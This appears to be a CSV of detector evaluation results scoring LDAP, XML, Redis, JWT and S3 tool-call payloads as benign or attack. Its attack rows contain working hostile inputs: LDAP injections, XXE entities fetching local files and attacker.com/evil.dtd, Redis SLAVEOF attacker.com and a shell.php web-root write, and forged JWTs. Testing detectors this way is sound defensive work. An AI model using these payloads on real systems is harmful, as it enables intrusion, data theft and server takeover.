tool_name,payload,true_label,pred_label,confidence,dist_benign,dist_attack
ldap_query,"{""filter"": ""(mail=user34@example.com)"", ""base"": ""ou=people,dc=company,dc=org""}",benign,attack,0.95,1024.297607421875,1362.82958984375
ldap_query,"{""filter"": ""(&(department=dept4)(active=true))"", ""base"": ""ou=users,dc=example,dc",benign,attack,0.95,116.44187927246094,620.763671875
ldap_query,"{""filter"": ""(cn=John Doe)"", ""base"": ""ou=contacts,dc=example,dc=com""}",benign,benign,0.95,2.499818801879883,81.63475036621094
ldap_query,"{""filter"": ""(cn=User 28)"", ""base"": ""ou=users,dc=example,dc=com""}",benign,attack,0.95,397.5939025878906,1663.8865966796875
ldap_query,"{""filter"": ""(uid=john)"", ""base"": ""ou=users,dc=example,dc=com""}",benign,attack,0.95,1115.85205078125,35.353633880615234
ldap_query,"{""filter"": ""(mail=user6@example.com)"", ""base"": ""ou=employees,dc=corp,dc=net""}",benign,attack,0.95,415.3143005371094,692.1309814453125
ldap_query,"{""filter"": ""(employeeNumber=2)"", ""base"": ""ou=employees,dc=corp,dc=net""}",benign,attack,0.95,2113.78369140625,744.9140625
ldap_query,"{""filter"": ""(uid=user36)"", ""base"": ""ou=people,dc=company,dc=org""}",benign,attack,0.95,258.98876953125,1627.899169921875
ldap_query,"{""filter"": ""(mail=user16@example.com)"", ""base"": ""ou=people,dc=company,dc=org""}",benign,attack,0.95,1024.297607421875,1362.82958984375
ldap_query,"{""filter"": ""(employeeNumber=20)"", ""base"": ""ou=employees,dc=corp,dc=net""}",benign,attack,0.95,2210.318115234375,1468.864990234375
ldap_query,"{""filter"": ""(employeeNumber=22)"", ""base"": ""ou=employees,dc=corp,dc=net""}",benign,attack,0.95,2210.3046875,1468.87939453125
ldap_query,"{""filter"": ""(mail=user32@example.com)"", ""base"": ""ou=users,dc=example,dc=com""}",benign,attack,0.95,921.25927734375,1379.7193603515625
ldap_query,"{""filter"": ""(&(department=dept0)(active=true))"", ""base"": ""ou=employees,dc=corp,d",benign,benign,0.95,2.4867947101593018,614.2816772460938
ldap_query,"{""filter"": ""(&(department=dept6)(active=true))"", ""base"": ""ou=employees,dc=corp,d",benign,benign,0.95,2.4867947101593018,614.2816772460938
ldap_query,"{""filter"": ""(mail=*@example.com)"", ""base"": ""ou=users,dc=example,dc=com""}",benign,attack,0.95,939.8021240234375,110.96736145019531
ldap_query,"{""filter"": ""(employeeNumber=0)"", ""base"": ""ou=users,dc=example,dc=com""}",benign,attack,0.95,2182.35009765625,755.458984375
ldap_query,"{""filter"": ""(uid=user8)"", ""base"": ""ou=employees,dc=corp,dc=net""}",benign,attack,0.95,971.6924438476562,826.2315063476562
ldap_query,"{""filter"": ""(employeeNumber=24)"", ""base"": ""ou=people,dc=company,dc=org""}",benign,attack,0.95,2210.359375,1468.849365234375
ldap_query,"{""filter"": ""\\00*)(uid=admin"", ""base"": ""ou=users,dc=example,dc=com""}",attack,attack,0.95,1330.4720458984375,1556.2288818359375
ldap_query,"{""filter"": ""(uid=admin)"", ""base"": ""ou=admins,dc=corp,dc=net""}",attack,attack,0.95,3092.005615234375,2.478633165359497
ldap_query,"{""filter"": ""(objectClass=*)"", ""base"": ""cn=admin,dc=example,dc=com""}",attack,attack,0.95,1581.977294921875,44.840431213378906
ldap_query,"{""filter"": ""*)(|(objectClass=*))"", ""base"": ""dc=corp,dc=net""}",attack,attack,0.95,3782.631103515625,2.4787757396698
ldap_query,"{""filter"": ""(memberOf=cn=Domain Admins)"", ""base"": ""dc=example,dc=com""}",attack,attack,0.95,904.0820922851562,2.489974021911621
ldap_query,"{""filter"": ""admin)(|(password=*)"", ""base"": ""ou=users,dc=example,dc=com""}",attack,attack,0.95,2963.3583984375,21.127986907958984
ldap_query,"{""filter"": ""*)(objectClass=*"", ""base"": ""dc=example,dc=com""}",attack,attack,0.95,2290.386474609375,2.4650676250457764
ldap_query,"{""filter"": "")(cn=*)(|(cn=*"", ""base"": ""dc=corp,dc=net""}",attack,attack,0.95,5188.84326171875,57.322261810302734
ldap_query,"{""filter"": ""*)(uid=*))(|(uid=*"", ""base"": ""dc=example,dc=com""}",attack,attack,0.95,4418.79931640625,2.5191240310668945
parse_xml,"{""xml"": ""<config><item id=\""18\"">value</item></config>""}",benign,benign,0.95,1.480164885520935,1168.535888671875
parse_xml,"{""xml"": ""<?xml version=\""1.0\""?><data><id>12</id></data>""}",benign,attack,0.95,1240.321044921875,2034.4422607421875
parse_xml,"{""xml"": ""<users><user id=\""1\""><name>John</name></user></users>""}",benign,attack,0.95,836.642578125,1433.7064208984375
parse_xml,"{""xml"": ""<?xml version=\""1.0\""?><data><id>2</id></data>""}",benign,attack,0.95,1226.4002685546875,2027.5755615234375
parse_xml,"{""xml"": ""<users><user id=\""10\""><name>User10</name></user></users>""}",benign,benign,0.95,2.265624523162842,1617.4007568359375
parse_xml,"{""xml"": ""<response code=\""200\""><message>OK 22</message></response>""}",benign,attack,0.95,954.5631103515625,2271.981689453125
parse_xml,"{""xml"": ""<order id=\""8\""><status>pending</status></order>""}",benign,attack,0.95,347.1366882324219,1090.453369140625
parse_xml,"{""xml"": ""<response code=\""200\""><message>OK 28</message></response>""}",benign,attack,0.95,911.3790893554688,2224.593994140625
parse_xml,"{""xml"": ""<note><to>User</to><from>Admin</from><body>Hello</body></note>""}",benign,attack,0.95,1680.483154296875,2387.0322265625
parse_xml,"{""xml"": ""<order id=\""24\""><status>pending</status></order>""}",benign,attack,0.95,341.27264404296875,1185.35791015625
parse_xml,"{""xml"": ""<feed><entry><title>Hello</title></entry></feed>""}",benign,attack,0.95,590.330810546875,1588.904052734375
parse_xml,"{""xml"": ""<order><id>123</id><items><item>Book</item></items></order>""}",benign,attack,0.95,817.5947875976562,2482.157958984375
parse_xml,"{""xml"": ""<?xml version=\""1.0\""?><data><item>test</item></data>""}",benign,attack,0.95,667.9400634765625,1317.7093505859375
parse_xml,"{""xml"": ""<users><user id=\""16\""><name>User16</name></user></users>""}",benign,benign,0.95,2.265624523162842,1617.4007568359375
parse_xml,"{""xml"": ""<config><item id=\""30\"">value</item></config>""}",benign,benign,0.95,1.480164885520935,1168.535888671875
parse_xml,"{""xml"": ""<users><user id=\""26\""><name>User26</name></user></users>""}",benign,benign,0.95,2.265624523162842,1617.4007568359375
parse_xml,"{""xml"": ""<products><product><name>Widget</name><price>9.99</price></product></pr",benign,attack,0.95,1256.9072265625,1491.930908203125
parse_xml,"{""xml"": ""<config><item id=\""0\"">value</item></config>""}",benign,attack,0.95,4.162620544433594,1044.5487060546875
parse_xml,"{""xml"": ""<config><item id=\""6\"">value</item></config>""}",benign,attack,0.95,4.162620544433594,1044.5487060546875
parse_xml,"{""xml"": ""<response status=\""ok\""><message>Success</message></response>""}",benign,benign,0.95,2.257572889328003,918.5855712890625
parse_xml,"{""xml"": ""<config><setting name=\""debug\"">false</setting></config>""}",benign,attack,0.95,497.3455505371094,608.4082641601562
parse_xml,"{""xml"": ""<?xml version=\""1.0\""?><data><id>4</id></data>""}",benign,attack,0.95,1226.4002685546875,2027.5755615234375
parse_xml,"{""xml"": ""<config><item id=\""20\"">value</item></config>""}",benign,benign,0.95,1.480164885520935,1168.535888671875
parse_xml,"{""xml"": ""<response code=\""200\""><message>OK 14</message></response>""}",benign,attack,0.95,883.2235107421875,2190.219482421875
parse_xml,"{""xml"": ""<?xml version=\""1.0\""?><!DOCTYPE foo [<!ENTITY % xxe SYSTEM 'file:///et",attack,attack,0.95,4199.337890625,2.2683417797088623
parse_xml,"{""xml"": ""<?xml version=\""1.0\""?><!DOCTYPE data [<!ENTITY xxe SYSTEM 'http://169.",attack,attack,0.95,2890.42431640625,1559.090087890625
parse_xml,"{""xml"": ""<!DOCTYPE test [<!ENTITY xxe SYSTEM 'php://filter/convert.base64-encode",attack,attack,0.95,3740.36279296875,1112.3013916015625
parse_xml,"{""xml"": ""<credentials><username>admin</username><password>secret</password></cre",attack,attack,0.95,2113.8427734375,2.2800116539001465
parse_xml,"{""xml"": ""<config><apiKey>sk-xxx</apiKey></config>""}",attack,attack,0.95,615.9918823242188,2.2687582969665527
parse_xml,"{""xml"": ""<?xml version=\""1.0\""?><!DOCTYPE foo [<!ENTITY xxe SYSTEM 'file:///etc/",attack,attack,0.95,3608.88232421875,2.274533987045288
parse_xml,"{""xml"": ""<!DOCTYPE :[ <!ENTITY x SYSTEM \""file:///dev/random\""> ]><x>&x;</x>""}",attack,attack,0.95,3666.527587890625,779.7528686523438
parse_xml,"{""xml"": ""<!DOCTYPE root [<!ENTITY % dtd SYSTEM 'http://attacker.com/evil.dtd'>%d",attack,attack,0.95,4070.08056640625,2.2652440071105957
redis_command,"{""command"": ""GET"", ""args"": [""session:18""]}",benign,benign,0.95,2.2674052715301514,1934.1878662109375
redis_command,"{""command"": ""GET"", ""args"": [""session:22""]}",benign,attack,0.95,221.08804321289062,2108.029541015625
redis_command,"{""command"": ""HGET"", ""args"": [""user:28"", ""name""]}",benign,attack,0.95,386.8968811035156,1287.6253662109375
redis_command,"{""command"": ""HSET"", ""args"": [""user:1"", ""email"", ""john@example.com""]}",benign,attack,0.95,1557.0770263671875,1356.499267578125
redis_command,"{""command"": ""EXPIRE"", ""args"": [""temp:14"", ""3600""]}",benign,attack,0.95,621.6923217773438,866.0059204101562
redis_command,"{""command"": ""HGET"", ""args"": [""user:6"", ""name""]}",benign,attack,0.95,432.44439697265625,1323.09130859375
redis_command,"{""command"": ""INCR"", ""args"": [""counter""]}",benign,attack,0.95,745.6119384765625,1748.0030517578125
redis_command,"{""command"": ""INCR"", ""args"": [""counter:38""]}",benign,attack,0.95,666.2655639648438,1524.7840576171875
redis_command,"{""command"": ""SADD"", ""args"": [""tags"", ""python""]}",benign,benign,0.95,2.262545585632324,1472.9090576171875
redis_command,"{""command"": ""ZADD"", ""args"": [""leaderboard"", ""100"", ""user1""]}",benign,attack,0.95,2148.982666015625,1710.576171875
redis_command,"{""command"": ""LPUSH"", ""args"": [""queue:0"", ""task0""]}",benign,attack,0.95,385.37200927734375,842.16845703125
redis_command,"{""command"": ""HGET"", ""args"": [""user:10"", ""name""]}",benign,attack,0.95,386.8968811035156,1287.6253662109375
redis_command,"{""command"": ""LPUSH"", ""args"": [""queue"", ""task1""]}",benign,attack,0.95,464.9886779785156,816.2992553710938
redis_command,"{""command"": ""HGET"", ""args"": [""user:1"", ""name""]}",benign,attack,0.95,432.44439697265625,1323.09130859375
redis_command,"{""command"": ""SET"", ""args"": [""cache:page"", ""data""]}",benign,attack,0.95,99.33757781982422,2211.063720703125
redis_command,"{""command"": ""GET"", ""args"": [""session:123""]}",benign,attack,0.95,245.9800262451172,1880.308837890625
redis_command,"{""command"": ""GET"", ""args"": [""session:2""]}",benign,attack,0.95,258.54815673828125,1987.561767578125
redis_command,"{""command"": ""INCR"", ""args"": [""counter:20""]}",benign,attack,0.95,666.2655639648438,1524.7840576171875
redis_command,"{""command"": ""SET"", ""args"": [""cache:page:36"", ""data""]}",benign,attack,0.95,202.0568389892578,2017.3511962890625
redis_command,"{""command"": ""INCR"", ""args"": [""counter:30""]}",benign,attack,0.95,666.2655639648438,1524.7840576171875
redis_command,"{""command"": ""INCR"", ""args"": [""counter:32""]}",benign,attack,0.95,666.2655639648438,1524.7840576171875
redis_command,"{""command"": ""SET"", ""args"": [""cache:page:4"", ""data""]}",benign,benign,0.95,2.2587337493896484,2081.426025390625
redis_command,"{""command"": ""LPUSH"", ""args"": [""queue:3"", ""task8""]}",benign,attack,0.95,563.9107666015625,682.3204345703125
redis_command,"{""command"": ""LPUSH"", ""args"": [""queue:1"", ""task26""]}",benign,attack,0.95,550.3413696289062,637.5001220703125
redis_command,"{""command"": ""INCR"", ""args"": [""counter:12""]}",benign,attack,0.95,666.2655639648438,1524.7840576171875
redis_command,"{""command"": ""INCR"", ""args"": [""counter:24""]}",benign,attack,0.95,666.2655639648438,1524.7840576171875
redis_command,"{""command"": ""TTL"", ""args"": [""session:123""]}",benign,attack,0.95,335.9097595214844,2053.006591796875
redis_command,"{""command"": ""EXPIRE"", ""args"": [""temp:16"", ""3600""]}",benign,attack,0.95,804.7140502929688,1026.984375
redis_command,"{""command"": ""EXPIRE"", ""args"": [""cache:key"", ""3600""]}",benign,benign,0.95,2.27276611328125,937.708251953125
redis_command,"{""command"": ""GET"", ""args"": [""session:34""]}",benign,benign,0.95,2.2674052715301514,1934.1878662109375
redis_command,"{""command"": ""DEBUG"", ""args"": [""SEGFAULT""]}",attack,attack,0.95,2835.64453125,2.2708041667938232
redis_command,"{""command"": ""KEYS"", ""args"": [""*""]}",attack,attack,0.95,1602.725830078125,2.2238664627075195
redis_command,"{""command"": ""EVAL"", ""args"": [""return os.execute('id')"", ""0""]}",attack,attack,0.95,4231.0693359375,2.2851829528808594
redis_command,"{""command"": ""MODULE"", ""args"": [""LOAD"", ""/tmp/malicious.so""]}",attack,attack,0.95,14285714432.0,14285714432.0
redis_command,"{""command"": ""CONFIG"", ""args"": [""GET"", ""requirepass""]}",attack,attack,0.95,2319.295166015625,2.2639870643615723
redis_command,"{""command"": ""FLUSHALL"", ""args"": []}",attack,attack,0.95,1565.814208984375,2.296149730682373
redis_command,"{""command"": ""SLAVEOF"", ""args"": [""attacker.com"", ""6379""]}",attack,attack,0.95,917.6531372070312,689.484130859375
redis_command,"{""command"": ""INFO"", ""args"": []}",attack,attack,0.95,803.813232421875,220.32711791992188
redis_command,"{""command"": ""CONFIG"", ""args"": [""SET"", ""dir"", ""/var/www/html""]}",attack,attack,0.95,13888889856.0,13888889856.0
redis_command,"{""command"": ""CONFIG"", ""args"": [""SET"", ""dbfilename"", ""shell.php""]}",attack,attack,0.95,2260.8291015625,2.3038506507873535
verify_jwt,"{""token"": ""eyJhbGciOiJIUzM4NCIsInR5cCI6IkpXVCJ9.eyJkYXRhIjoidGVzdCJ9.sig""}",benign,attack,0.95,1096.7169189453125,2337.771484375
verify_jwt,"{""token"": ""eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJ1c2VyXyIgfQ.signature",benign,benign,0.95,1.9351447820663452,648.8156127929688
verify_jwt,"{""token"": ""eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJ1c2VyXyIgfQ.signature",benign,benign,0.95,1.9389532804489136,1002.8255615234375
verify_jwt,"{""token"": ""eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJ1c2VyXyIgfQ.signature",benign,benign,0.95,2.8394224643707275,698.7009887695312
verify_jwt,"{""token"": ""eyJhbGciOiJFUzI1NiIsInR5cCI6IkpXVCJ9.eyJuYW1lIjoiSmFuZSJ9.sig""}",benign,attack,0.95,917.3439331054688,1787.7939453125
verify_jwt,"{""token"": ""eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJ1c2VyXyIgfQ.signature",benign,attack,0.95,5.654775142669678,767.9534912109375
verify_jwt,"{""token"": ""eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJ1c2VyXyIgfQ.signature",benign,attack,0.95,6.8943939208984375,881.4966430664062
verify_jwt,"{""token"": ""eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJ1c2VyXyIgfQ.signature",benign,attack,0.95,6.8100762367248535,795.6563110351562
verify_jwt,"{""token"": ""eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJ1c2VyXyIgfQ.signature",benign,attack,0.95,5.654775142669678,767.9534912109375
verify_jwt,"{""token"": ""eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJ1c2VyXyIgfQ.signature",benign,attack,0.95,9.936667442321777,872.3638916015625
verify_jwt,"{""token"": ""eyJhbGciOiJIUzI1NiJ9.eyJ1c2VyX2lkIjoxMjN9.sig""}",benign,attack,0.95,2526.19482421875,573.44921875
verify_jwt,"{""token"": ""eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiJ9.eyJpc3MiOiJhcHAiLCJzdWIiOiJ1c2Vy",benign,attack,0.95,1109.3338623046875,2032.669921875
verify_jwt,"{""token"": ""eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJ1c2VyXyIgfQ.signature",benign,attack,0.95,6.8100762367248535,795.6563110351562
verify_jwt,"{""token"": ""eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJ1c2VyXyIgfQ.signature",benign,attack,0.95,3.8744313716888428,933.0963745117188
verify_jwt,"{""token"": ""eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJ1c2VyXyIgfQ.signature",benign,attack,0.95,3.8744313716888428,933.0963745117188
verify_jwt,"{""token"": ""eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJ1c2VyXyIgfQ.signature",benign,attack,0.95,5.654775142669678,767.9534912109375
verify_jwt,"{""token"": ""eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFt",benign,attack,0.95,3094.7744140625,800.6242065429688
verify_jwt,"{""token"": ""eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJ1c2VyXyIgfQ.signature",benign,attack,0.95,8.749449729919434,842.8974609375
verify_jwt,"{""token"": ""eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJ1c2VyXyIgfQ.signature",benign,attack,0.95,6.8943939208984375,881.4966430664062
verify_jwt,"{""token"": ""eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJ1c2VyXyIgfQ.signature",benign,attack,0.95,3.3545117378234863,712.229736328125
verify_jwt,"{""token"": ""eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJ1c2VyXyIgfQ.signature",benign,attack,0.95,9.936667442321777,872.3638916015625
verify_jwt,"{""token"": ""eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiIsImtpZCI6Inwgc2xlZXAgMTAgfCJ9.eyJy",attack,attack,0.95,2406.57421875,975.5858764648438
verify_jwt,"{""token"": ""eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.eyJyb2xlIjoiYWRtaW4ifQ.sig"", ""ke",attack,attack,0.95,17391304704.0,17391304704.0
verify_jwt,"{""token"": ""eyJhbGciOiJIUzI1NiJ9.eyJhcGlfa2V5IjoieHh4In0.sig""}",attack,attack,0.95,2379.866455078125,224.51707458496094
verify_jwt,"{""token"": ""eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJyb2xlIjoiYWRtaW4ifQ.""}",attack,attack,0.95,2158.622314453125,2.0307071208953857
verify_jwt,"{""token"": ""eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCIsImp3ayI6eyJrdHkiOiJvY3QiLCJrIjoiY",attack,attack,0.95,3581.12158203125,1.9051719903945923
verify_jwt,"{""token"": ""eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCIsImtpZCI6Ii4uLy4uLy4uL2V0Yy9wYXNzd",attack,attack,0.95,2847.180908203125,370.54083251953125
verify_jwt,"{""token"": ""eyJhbGciOiJIUzI1NiJ9.eyJyb2xlIjoiYWRtaW4ifQ.secret""}",attack,attack,0.95,3759.20654296875,2.0521767139434814
s3_operation,"{""operation"": ""list"", ""bucket"": ""assets"", ""prefix"": ""images/18/""}",benign,attack,0.95,427.0628967285156,1392.6343994140625
s3_operation,"{""operation"": ""head"", ""bucket"": ""data"", ""key"": ""reports/report10.csv""}",benign,attack,0.95,599.6061401367188,1318.1085205078125
s3_operation,"{""operation"": ""list"", ""bucket"": ""assets"", ""prefix"": ""images/""}",benign,attack,0.95,2089.5966796875,515.608154296875
s3_operation,"{""operation"": ""list"", ""bucket"": ""assets"", ""prefix"": ""images/2/""}",benign,attack,0.95,649.5726318359375,1572.6197509765625
s3_operation,"{""operation"": ""put"", ""bucket"": ""uploads"", ""key"": ""user24/file.txt""}",benign,benign,0.95,2.268193006515503,1451.6279296875
s3_operation,"{""operation"": ""list"", ""bucket"": ""assets"", ""prefix"": ""images/14/""}",benign,attack,0.95,427.0628967285156,1392.6343994140625
s3_operation,"{""operation"": ""list"", ""bucket"": ""assets"", ""prefix"": ""images/8/""}",benign,attack,0.95,649.5726318359375,1572.6197509765625
s3_operation,"{""operation"": ""list"", ""bucket"": ""logs"", ""prefix"": ""2024/01/""}",benign,attack,0.95,1356.06640625,1289.77880859375
s3_operation,"{""operation"": ""put"", ""bucket"": ""uploads"", ""key"": ""user12/file.txt""}",benign,benign,0.95,2.268193006515503,1451.6279296875
s3_operation,"{""operation"": ""put"", ""bucket"": ""backups"", ""key"": ""2024/backup.sql""}",benign,benign,0.95,2.267059803009033,1107.007568359375
s3_operation,"{""operation"": ""delete"", ""bucket"": ""temp"", ""key"": ""cache/old.json""}",benign,attack,0.95,211.02015686035156,1740.2061767578125
s3_operation,"{""operation"": ""get"", ""bucket"": ""documents"", ""key"": ""reports/annual.pdf""}",benign,attack,0.95,974.608154296875,1641.502685546875
